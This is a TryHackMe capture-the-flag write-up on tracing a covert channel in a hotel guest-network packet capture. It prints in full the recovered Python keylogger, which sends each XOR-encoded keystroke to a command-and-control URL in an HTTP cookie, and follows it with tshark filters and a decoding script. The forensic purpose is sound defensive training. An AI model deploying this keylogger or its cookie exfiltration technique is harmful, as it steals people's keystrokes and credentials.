---
title: "TryHackMe - Byte Lotus: Concierge Briefing"
date: 2026-07-30
tags: ["TryHackMe", "Penetration Testing", "Network Forensics", "Wireshark", "Keylogger", "Exfiltration"]
excerpt: "Tracing a hotel guest-network capture to a self-installing Python keylogger that smuggled each keystroke out one HTTP cookie at a time, then recovering the XOR key from its own source to decode the exfil."
---

# TryHackMe: Byte Lotus — Concierge Briefing (Covert Channel Writeup)

**Room theme:** Byte Lotus again, this time a short packet capture (`traffic.pcapng`) pulled from the guest network. No attackbox provided — analysis done locally in Wireshark on macOS.

**Task itinerary:**
- Analyze the provided capture for a covert communication channel.
- Identify where the exfiltrated data is being hidden and reassemble it.
- Decode the recovered data and submit the flag.

## Setting up

No attackbox this time, so tooling went on the local machine: `brew install wireshark` for both the GUI and `tshark` CLI.

## First pass: Protocol Hierarchy and noise

Opening `traffic.pcapng` in Wireshark, the first dozen frames are just loopback noise — repeated SYN/RST cycles between `127.0.0.1:53525` and `127.0.0.1:28194`, plus a stray ARP exchange. None of that is part of the actual story; it's just background chatter from the capture host.

## Finding the real traffic

The first meaningful exchange starts around frame 13: `192.168.1.141` (the guest device) opens a TCP connection to `34.41.103.191:8080` and issues:

```
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
```

The response comes back `200 OK` with `Content-Type: text/x-python` — the guest device is pulling down a Python script over plain HTTP. That's the lead: something on the guest network fetched and presumably ran this file.

## Reading the payload: Follow → HTTP Stream

Right-clicking the response frame and using **Follow → HTTP Stream** reassembles the full body. It turned out to be a keylogger:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

That explains the "tiny packets, odd hours, suspiciously regular" flavor text exactly: **every single keystroke** triggers its own outbound HTTP GET. Each character gets XOR'd with the key `"H0t3lSt@ff0Nly" + "K3epS3cr3t!"`, base64-encoded, and stuffed into a `Cookie: hotel_sess_state=<value>` header sent to the C2 endpoint — a covert channel hiding in plain, boring-looking cookie traffic.

## Reassembling the exfil

With the mechanism and key known, the next step was pulling every exfil request out of the capture in order:

```
tshark -r traffic.pcapng -Y 'http.cookie contains "hotel_sess_state"' -T fields -e http.cookie
```

This returned 30 cookie values in capture order, one per keystroke, e.g.:

```
hotel_sess_state=HA== hotel_sess_state=AA== hotel_sess_state=BQ== ...
```

## Decoding

Each value gets base64-decoded, then XOR'd against the recovered key to recover the original character. A short script does the whole reconstruction:

```python
import base64

key = "H0t3lSt@ff0NlyK3epS3cr3t!".encode()

def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

cookies = [
    "HA==","AA==","BQ==","Mw==","Hg==","ew==","Og==","fA==","Fw==","eQ==",
    "Ow==","Fw==","Pw==","fA==","PA==","Kw==","IA==","eQ==","Jg==","Lw==",
    "Fw==","eA==","Pg==","LQ==","Gg==","Fw==","MQ==","eA==","PQ==","NQ==",
]

msg = ""
for c in cookies:
    raw = base64.b64decode(c)
    dec = xor(raw, key)
    msg += dec.decode("utf-8", errors="replace")

print(msg)
```

Output:

```
THM{xxxx}
```

## The flag

```
THM{xxxx}
```

## Takeaways

- "Regular tiny packets at odd hours" is a strong signal of a per-event beacon rather than a bulk transfer — worth checking request cadence and payload size before assuming a single big exfil blob.
- Covert channels don't need exotic protocols — a plain HTTP cookie header is enough to hide data in traffic that looks like ordinary session state.
- When a capture includes the malware's own delivery (here, the `updates.py` download over HTTP), read that payload first — it often hands you the exact key/algorithm needed to decode the rest of the traffic, no cracking required.
- `tshark` display filters are the fastest way to extract a repeated, structured field (like one cookie header) across many packets rather than clicking through each frame manually in the GUI.